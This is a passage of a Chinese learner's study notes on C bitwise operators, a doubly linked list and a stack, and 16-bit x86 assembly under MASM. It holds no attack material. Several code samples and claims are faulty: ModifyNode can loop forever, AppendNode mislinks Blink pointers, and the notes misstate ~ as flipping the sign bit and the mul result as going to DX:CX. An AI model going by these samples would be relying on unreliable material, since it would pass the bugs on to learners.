m(1, 2);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要是加载系统库，调用系统api</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148903.png" alt="image-20211005194712387"></p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><pre class="line-numbers language-none"><code class="language-none">~    取反&amp;    与|    或^    异或&lt;&lt;   左移&gt;&gt;   右移<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="取反"><a href="#取反" class="headerlink" title="~     取反"></a>~     取反</h3><p>取反指的是符号位</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148904.png" alt="image-20211005212700715"></p><h3 id="amp-与"><a href="#amp-与" class="headerlink" title="&amp;     与"></a>&amp;     与</h3><pre class="line-numbers language-none"><code class="language-none">都为1:结果为1否则为:0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148905.png" alt="image-20211005212512309"></p><h2 id="或"><a href="#或" class="headerlink" title="|     或"></a>|     或</h2><pre class="line-numbers language-none"><code class="language-none">一个为1结果为:1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148906.png" alt="image-20211005213030550"></p><h2 id="异或"><a href="#异或" class="headerlink" title="^     异或"></a>^     异或</h2><pre class="line-numbers language-none"><code class="language-none">相同为:0不同为:1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148908.png" alt="image-20211005214112550"></p><h2 id="异或加密"><a href="#异或加密" class="headerlink" title="异或加密"></a>异或加密</h2><p>简单来说 就是知道两个 就可以得出第三个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148909.png" alt="image-20211005214419840"></p><h2 id="lt-lt-左移"><a href="#lt-lt-左移" class="headerlink" title="<<    左移"></a>&lt;&lt;    左移</h2><pre class="line-numbers language-none"><code class="language-none">原来的数 &lt;&lt; 相当于 乘 2的N次幂  N:左移的位数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148910.png" alt="image-20211005215309680"></p><h2 id="gt-gt-右移"><a href="#gt-gt-右移" class="headerlink" title=">>     右移"></a>&gt;&gt;     右移</h2><pre class="line-numbers language-none"><code class="language-none">原来的数 &gt;&gt; 相当于 除以 2的N次幂  N:右移的位数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148911.png" alt="image-20211005215358196"></p><h2 id="位域-位字段"><a href="#位域-位字段" class="headerlink" title="位域(位字段)"></a>位域(位字段)</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148912.png" alt="image-20211005215824640"></p><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><pre class="line-numbers language-none"><code class="language-none">true:返回左边false:返回右边<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148913.png" alt="image-20211005220207300"></p><h2 id="双向链表-gt-图书管理系统"><a href="#双向链表-gt-图书管理系统" class="headerlink" title="双向链表->图书管理系统"></a>双向链表-&gt;图书管理系统</h2><p>传入的参数 带* 意思是要更改</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;string.h&gt;//书籍的结构体typedef struct Node{struct Node *Blink;//一个向上的指针struct Node *Flink;//一个向下的指针char BookName[50];float BookPrice;int BookNumber;};int NodeCount = 0; //定义一个节点总数struct Node* HeaderNode = NULL;//增加书籍的函数 增加到后面struct Node* AppendNode(struct Node* CurrentNode, char* BookName, float BookPrice, int BookNumber); //CurrentNode是当前的节点//查询书籍的函数void QueryNode(struct Node* HeadNode, char* BookName);   //HeadNode是头节点//修改书籍的函数void ModifyNode(struct Node* HeadNode, char* BookName, float BookPrice);//删除书籍的函数void DeleteNode(struct Node* HeadNode, char* BookName);int main(){while (true){int flag = 0;//选择的功能序号char fBookName[50];float fBookPrice;float fNewBookPrice;int fBookNumber;printf("请输入需要使用的功能:\n");printf("1.添加书籍信息:\n");printf("2.查询书籍信息:\n");printf("3.修改书籍信息:\n");printf("4.删除书籍信息:\n");scanf("%d", &amp;flag);switch (flag){case 1:memset(fBookName, 0, 50); //刷新内存printf("请输入书名:");scanf("%s", &amp;fBookName);printf("请输入价格:");scanf("%f", &amp;fBookPrice);printf("请输入书号:");scanf("%d", &amp;fBookNumber);HeaderNode = AppendNode(HeaderNode, fBookName, fBookPrice, fBookNumber);break;case 2:memset(fBookName, 0, 50);printf("请输入书名:");scanf("%s", &amp;fBookName);QueryNode(HeaderNode, fBookName);break;case 3:memset(fBookName, 0, 50);printf("请输入书名:");scanf("%s", &amp;fBookName);printf("请输入新价格:");scanf("%f", &amp;fNewBookPrice);ModifyNode(HeaderNode, fBookName, fNewBookPrice);break;case 4:memset(fBookName, 0, 50);printf("请输入书名:");scanf("%s", &amp;fBookName);DeleteNode(HeaderNode, fBookName);break;default:break;}}system("pause");return 0;}struct Node* AppendNode(struct Node* CurrentNode, char* BookName, float BookPrice, int BookNumber) {struct Node* pNewNode = NULL;//定义一个新节点struct Node* pTempNode = NULL;//定义一个临时节点struct Node* pHeadNode = CurrentNode;//定义一个头节点,接收当前节点pNewNode = (struct Node*)malloc(sizeof(struct Node));//给新节点申请内存if (pNewNode == NULL) { //判断新节点申请内存是否成功printf("memory malloc failed!\n");return pNewNode;}if (CurrentNode == NULL) { //判断当前节点内存是否为空，为空则是一个空链表CurrentNode = pNewNode; //把新节点作为头节点CurrentNode-&gt;Blink = NULL; //把当前节点的上下节点都置空，这样大家都知道你是头节点CurrentNode-&gt;Flink = NULL;}else { //不是头节点，就需要找到最后的节点，然后插到它后面while (pHeadNode-&gt;Flink != NULL)  //循环把节点指到最后{pTempNode = pHeadNode;pHeadNode = pHeadNode-&gt;Flink;}pHeadNode-&gt;Flink = pNewNode;pHeadNode-&gt;Blink = pTempNode;}strcpy(pNewNode-&gt;BookName, BookName);pNewNode-&gt;BookPrice = BookPrice;pNewNode-&gt;BookNumber = BookNumber;NodeCount++;//节点总数自增pNewNode-&gt;Flink = NULL;return CurrentNode;}void QueryNode(struct Node* HeadNode, char* BookName){if (HeadNode == NULL) //判断头节点是否为空{printf("Error: HeadNode = NULL\n");return;}for (int i = 0; i &lt; NodeCount; i++){if (strcmp(HeadNode-&gt;BookName, BookName) == 0){printf("书名： %s\n", HeadNode-&gt;BookName);printf("价格： %f\n", HeadNode-&gt;BookPrice);printf("书号： %d\n", HeadNode-&gt;BookNumber);return;}HeadNode = HeadNode-&gt;Flink;}//while(HeadNode-&gt;Flink != NULL)//{//HeadNode = HeadNode-&gt;Flink;//if (strcmp(HeadNode-&gt;BookName, BookName) == 0)//{//printf("书名： %s\n", HeadNode-&gt;BookName);//printf("价格： %f\n", HeadNode-&gt;BookPrice);//printf("书号： %d\n", HeadNode-&gt;BookNumber);//return;//}//}printf("Query failed\n");}void ModifyNode(struct Node* HeadNode, char* BookName, float BookPrice){if (HeadNode == NULL) //判断头节点是否为空{printf("Error: HeadNode == NULL\n");return;}if (strcmp(HeadNode-&gt;BookName, BookName) == 0) //修改头节点{HeadNode-&gt;BookPrice = BookPrice;printf("ModifyNode Success!\n");return;}while (HeadNode-&gt;Flink != NULL){if (strcmp(HeadNode-&gt;BookName, BookName) == 0){HeadNode-&gt;BookPrice = BookPrice;printf("ModifyNode Success!\n");return;}}printf("ModifyNode failed!\n");return;}void DeleteNode(struct Node* HeadNode, char* BookName){struct Node* pNode = NULL; //定义一个临时节点pNode = HeadNode; //临时节点 指向头节点for (int i = 0; i &lt; NodeCount; i++)//进行遍历{if (strcmp(pNode-&gt;BookName, BookName) == 0) //判断名字是否一致{if (pNode == HeadNode) //删除头节点{pNode = HeadNode-&gt;Flink;free(HeadNode);HeaderNode = pNode;HeadNode = HeaderNode;NodeCount--;printf("Delete Success!\n");return;}if (pNode-&gt;Flink == NULL) //删除最后一个节点{pNode-&gt;Blink-&gt;Flink = NULL;free(pNode);NodeCount--;printf("Delete Success!\n");return;}//如果是中间节点pNode-&gt;Blink-&gt;Flink = pNode-&gt;Flink; //这个节点的向上指针的 向下指针 指到这个节点的向下指针pNode-&gt;Flink-&gt;Blink = pNode-&gt;Blink;free(pNode);NodeCount--;printf("Delete Success!\n");return;}}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>连续内存-&gt;顺序栈</p><p>指针和&amp;连接-&gt;链栈</p><p>传入的参数 带* 意思是要更改</p><h2 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#define MAX_SIZE 20//定义一个顺序栈typedef struct{int nData[MAX_SIZE];//定义栈的大小int nTop;//定义一个栈顶指针}MStack;//InitStack初始化栈bool InitStack(MStack* Stack){Stack-&gt;nTop = -1;return true;}//ClearStack初始化栈bool ClearStack(MStack* Stack){Stack-&gt;nTop = -1;return true;}//判断空栈，判断栈顶指针是否为-1bool StackEmpty(MStack Stack){if (Stack.nTop == -1){return true;}else{return false;}}//计算栈的长度int StackLength(MStack Stack){return Stack.nTop + 1;}//取出栈的数据bool GetTop(MStack Stack, int* Data){if (Stack.nTop == -1){return false;}else{*Data = Stack.nData[Stack.nTop];}}//压栈bool push(MStack* Stack, int Data){if (Stack-&gt;nTop == MAX_SIZE-1) //判断是否满栈{return false;}else{Stack-&gt;nTop++;Stack-&gt;nData[Stack-&gt;nTop] = Data; //赋值return true;}}//弹出元素bool pop(MStack* Stack, int* Data){if (Stack-&gt;nTop == -1){return false;}else{*Data = Stack-&gt;nData[Stack-&gt;nTop];//数据取出Stack-&gt;nTop--;return true;}}//打印栈bool ShowStackValue(MStack Stack){if (Stack.nTop == -1){return false;}for (int i = 0; i &lt;= Stack.nTop; i++){printf("Stack Value = %d\n", Stack.nData[i]);}return true;}int main(){MStack mstack; //声明栈的对象InitStack(&amp;mstack); //初始化栈for (int i = 0; i &lt; 10; i++){push(&amp;mstack, i);}ShowStackValue(mstack);int n = 0;pop(&amp;mstack, &amp;n);printf("pop value = %d\n", n);GetTop(mstack, &amp;n);printf("GetTop value = %d\n", n);int Size = StackLength(mstack);printf("StackLength = %d\n", n);ShowStackValue(mstack);system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指针：从上到下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148914.png" alt="image-20211006191708866"></p><h2 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148915.png" alt="image-20211007114620004"></p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148916.png" alt="image-20211007114650512"></p><h2 id="寄存器的四则运算"><a href="#寄存器的四则运算" class="headerlink" title="寄存器的四则运算"></a>寄存器的四则运算</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148917.png" alt="image-20211007114730053"></p><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148918.png" alt="image-20211007114804010"></p><h2 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148919.png" alt="image-20211007115452712"></p><p>数据寄存器就是一堆触发器</p><p>保存的是指令</p><p>通过译码开始执行</p><p>判断取回来的指令有多长</p><p>然后指向下一条指令</p><h2 id="汇编语言简单示例"><a href="#汇编语言简单示例" class="headerlink" title="汇编语言简单示例"></a>汇编语言简单示例</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148920.png" alt="image-20211007114532607"></p><h2 id="汇编程序的执行过程"><a href="#汇编程序的执行过程" class="headerlink" title="汇编程序的执行过程"></a>汇编程序的执行过程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148921.png" alt="image-20211007112813586"></p><h2 id="16位处理器的通用寄存器"><a href="#16位处理器的通用寄存器" class="headerlink" title="16位处理器的通用寄存器"></a>16位处理器的通用寄存器</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148922.png" alt="image-20211007112922189"></p><p>他们本身也有自己的功能</p><pre class="line-numbers language-none"><code class="language-none">AX:累加器BX:基址CX:计数器DX:数据SI:原变址寄存器DI:目的变址寄存器SP:栈顶指针BP:栈底指针<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="内存字节序"><a href="#内存字节序" class="headerlink" title="内存字节序"></a>内存字节序</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148923.png" alt="image-20211007113519815"></p><h2 id="段"><a href="#段" class="headerlink" title="段"></a>段</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148924.png" alt="image-20211007114230799"></p><h2 id="偏移"><a href="#偏移" class="headerlink" title="偏移"></a>偏移</h2><p>offset</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148925.png" alt="image-20211007113931961"></p><pre class="line-numbers language-none"><code class="language-none">它存储在IP-&gt;16位的寄存器,也叫指令指针寄存器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148926.png" alt="image-20211007114308216"></p><h2 id="代码执行过程"><a href="#代码执行过程" class="headerlink" title="代码执行过程"></a>代码执行过程</h2><pre class="line-numbers language-none"><code class="language-none">汇编代码-&gt;经过汇编(MASM.exe)-&gt;obj文件-&gt;Link链接器(Link.exe)-&gt;exe可执行文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="16位汇编代码书写"><a href="#16位汇编代码书写" class="headerlink" title="16位汇编代码书写"></a>16位汇编代码书写</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148927.png" alt="image-20211007121346833"></p><pre class="line-numbers language-none"><code class="language-none">assume cs:code  ;代码的入口点cs,assume关键字是起别名,给cs起别名codecode segment   ;声明代码段的起始位置mov ax, 1234Hmov bx, 5678H;下面两行代码表示16进制的程序退出，相当于return 0 mov ax, 4c00H ;后面带H,表示16进制,没有表示10进制int 21Hcode ends;声明代码段的结束位置end;代码结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>单行注释:用分号 后面的内容 就被注释掉了</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148928.png" alt="image-20211007132445995"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148929.png" alt="image-20211007132507574"></p><h2 id="debug调试代码"><a href="#debug调试代码" class="headerlink" title="debug调试代码"></a>debug调试代码</h2><pre class="line-numbers language-none"><code class="language-none">p:单步步过t:单步步入-r:当前状态-u:接着显示-g:退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看特定位置</p><pre class="line-numbers language-none"><code class="language-none">-d 0B7E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148930.png" alt="image-20211007133928937"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148931.png" alt="image-20211007134147707"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148932.png" alt="image-20211007134322567"></p><h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><p>call的过程</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148933.png" alt="image-20211007135412562"></p><p>想要返回一个值,就把这个值放到寄存器里</p><pre class="line-numbers language-none"><code class="language-none">mov ax,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">assume cs:code ;代码的入口点cs,assume关键字是起别名,给cs起别名codecode segment;声明代码段的起始位置matrix proc ;matrix函数名,proc是起始位置mov ax,1ret ;函数一定要返回matrix endp   ;matrix函数名,endp是结束位置start:  call matrix ;函数调用,它是一个转移指令,start指定入口地址mov bx, ax;下面两行代码表示16进制的程序退出，相当于return 0 mov ax, 4c00H ;后面带H,表示16进制,没有表示10进制int 21Hcode ends  ;声明代码段的结束位置end start   ;代码结束;start也可以指定开始函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148934.png" alt="image-20211007140520179"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148935.png" alt="image-20211007140556135"></p><h2 id="加减法指令"><a href="#加减法指令" class="headerlink" title="加减法指令"></a>加减法指令</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148936.png" alt="image-20211007141543248"></p><pre class="line-numbers language-none"><code class="language-none">加法:addadd bx, ax把bx和ax相加 结果放到bx中incinc ax把ax+1 结果放到ax中减法:subsub bx, ax把bx和ax相减 结果放到bx中decdec ax把ax-1 结果放到ax中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="loop循环"><a href="#loop循环" class="headerlink" title="loop循环"></a>loop循环</h2><p>loop循环是把cx寄存器做 计数器,进行递减循环</p><pre class="line-numbers language-none"><code class="language-none">assume cs:code ;代码的入口点cs,assume关键字是起别名,给cs起别名codecode segment;声明代码段的起始位置    mov ax, 0    mov cx, 10rk:inc axloop rkmov ax, 4c00H ;后面带H,表示16进制,没有表示10进制int 21Hcode ends  ;声明代码段的结束位置end   ;代码结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148937.png" alt="image-20211008004341454"></p><h2 id="一个加法函数"><a href="#一个加法函数" class="headerlink" title="一个加法函数"></a>一个加法函数</h2><pre class="line-numbers language-none"><code class="language-none">assume cs:code ;代码的入口点cs,assume关键字是起别名,给cs起别名codecode segment;声明代码段的起始位置addx proc ;定义一个加法函数add si, dimov ax, si retaddx endpmatrix proc ;主函数mov si, 5mov di, 6call addxmov bx, axmov ax, 4c00H ;后面带H,表示16进制,没有表示10进制int 21Hmatrix endpstart: call matrixcode ends  ;声明代码段的结束位置end start  ;代码结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：返回指令和两条退出指令按p，其余按t</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148938.png" alt="image-20211008005833758"></p><h2 id="堆栈寄存器"><a href="#堆栈寄存器" class="headerlink" title="堆栈寄存器"></a>堆栈寄存器</h2><pre class="line-numbers language-none"><code class="language-none">类型:Byte   8位    简写:db类型:Word   16位    简写:dw栈顶指针:SP  初始是0   最大是FFFE栈底指针:BP  初始是0mov ax, 1push ax是把ax放到栈顶pop bx是把栈顶元素的值放到bx中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">assume cs:code ;代码的入口点cs,assume关键字是起别名,给cs起别名codecode segment;声明代码段的起始位置addx proc ;定义一个加法函数push bpmov bp, sp ;保存环境mov si, [bp + 4] ;中括号的作用的取对应的值mov di, [bp + 6]add si, dimov ax, si pop bpretaddx endpmatrix proc ;主函数mov ax, 5mov bx, 6push axpush bxcall addxadd sp, 4  ;把指针退回去mov bx, axmov ax, 4c00H ;后面带H,表示16进制,没有表示10进制int 21Hmatrix endpstart: call matrixcode ends  ;声明代码段的结束位置end start  ;代码结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148939.png" alt="image-20211008011218104"></p><h2 id="定义参数"><a href="#定义参数" class="headerlink" title="定义参数"></a>定义参数</h2><pre class="line-numbers language-none"><code class="language-none">assume cs:code, ds:datacode segment   ;代码段matrix procmov ax, datamov ds, axmov dx, offset buffer ;offset是取地址mov ah, 09H  ;09H显示字符串int 21Hmov ah, 07H  ;07H接收键盘输入int 21Hmov ax,4C00Hint 21Hmatrix endpstart:call matrixcode endsdata segment   ;数据段buffer db 0DH, 0AH, 'hahaha$' ;16位定义字符串的特殊写法,它是以中断进行打印的,0DH, 0AH是换行data endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：32/64位定义字符串</p><pre class="line-numbers language-none"><code class="language-none">buffer db 'hahahah', 0      ;它是以库函数进行打印的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148940.png" alt="image-20211008111430579"></p><h2 id="进位位-CF-amp-零值位-ZF"><a href="#进位位-CF-amp-零值位-ZF" class="headerlink" title="进位位(CF) &amp; 零值位(ZF)"></a>进位位(CF) &amp; 零值位(ZF)</h2><pre class="line-numbers language-none"><code class="language-none">进位位:如果运算结果的最高位产生一个进位或错位, 则CF置1, 否则CF置0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">零值位: 如果运算结果为零则ZF置1, 否则置0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CMP指令"><a href="#CMP指令" class="headerlink" title="CMP指令"></a>CMP指令</h2><pre class="line-numbers language-none"><code class="language-none">CMP OPRD1, OPRD2CMP指令也是两者相减但是它不会有返回值反而是影响标志位mov AX, 2mov BX, 1CMP AX, BX就是AX-BXAX-BX = 0  -&gt;   ZF = 1AX-BX != 0 -&gt;   ZF = 0AX &lt; BX    -&gt;   CF = 1AX &gt; BX    -&gt;   CF = 0 &amp;&amp; ZF = 0AX &lt;= BX   -&gt;   CF = 1 || ZF = 1AX &gt;= BX   -&gt;   CF = 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后 CMP 指令一般是拿来做分支 或者 循环</p><h2 id="一类跳转指令-实现循环"><a href="#一类跳转指令-实现循环" class="headerlink" title="一类跳转指令,实现循环"></a>一类跳转指令,实现循环</h2><p>就是Jxx指令，统称位JCC指令</p><pre class="line-numbers language-none"><code class="language-none">JMP address   ;JMP指令无条件跳转JE address    ;JE指令等于则跳转            判断就是ZF = 1JNE address   ;JNE指令不等于则跳转         判断就是ZF = 0JB address   ;JB指令小于则跳转             判断就是CF = 1JA address   ;JA指令大于则跳转             判断就是CF = 0 &amp;&amp; ZF = 0JNA address   ;JNA指令不大于(&lt;=)则跳转     判断就是CF = 1 || ZF = 1JNB address   ;JNB指令不小于(&gt;=)则跳转     判断就是CF = 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">assume cs:code, ds:datacode segment   ;代码段matrix procmov ax, datamov ds, axmov dx, offset buffer1 ;offset是取地址mov ah, 09H  ;09H显示字符串int 21Hjmp rk1mov dx, offset buffer2 ;offset是取地址mov ah, 09H  ;09H显示字符串int 21Hrk1:mov ah, 07H  ;07H接收键盘输入int 21Hmov ax,4C00Hint 21Hmatrix endpstart:call matrixcode endsdata segment   ;数据段buffer1 db 0DH, 0AH, 'hahaha1$' ;16位定义字符串的特殊写法buffer2 db 0DH, 0AH, 'hahaha2$'data endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148941.png" alt="image-20211008120817196"></p><h2 id="乘法运算符"><a href="#乘法运算符" class="headerlink" title="乘法运算符"></a>乘法运算符</h2><p>使用mul</p><p>注：被乘数是隐含的， 且总是指定为累加器AX 或 AL的内容</p><p>乘法的结果 超过16位 没有到达32位</p><p>那么结果会放在DX中 表示：</p><pre class="line-numbers language-none"><code class="language-none">DX:CX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">assume cs:codecode segment   ;代码段matrix procmov ax, 5mov bx, 6mul bx ;做乘法mov ax,4C00Hint 21Hmatrix endpstart:call matrixcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148942.png" 